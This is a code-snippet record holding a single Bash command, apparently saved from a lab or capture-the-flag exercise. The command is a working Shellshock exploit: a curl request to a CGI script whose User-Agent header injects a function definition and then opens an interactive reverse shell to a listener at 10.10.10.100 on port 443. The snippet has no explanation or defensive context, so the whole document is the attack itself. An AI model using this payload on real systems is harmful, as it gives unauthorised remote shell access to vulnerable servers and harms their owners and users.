---
id: a5724f1e-341b-4ece-a30f-00397a79c794
type: code
language: Bash
verified: false
created_at: '2019-10-10T21:06:32.230450+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet a5724f1e

**Language**: Bash

```bash
curl http://10.10.10.10/cgi-bin/user.sh -H 'User-Agent: () { :; }; /bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.10.100/443 0>&1"'
```


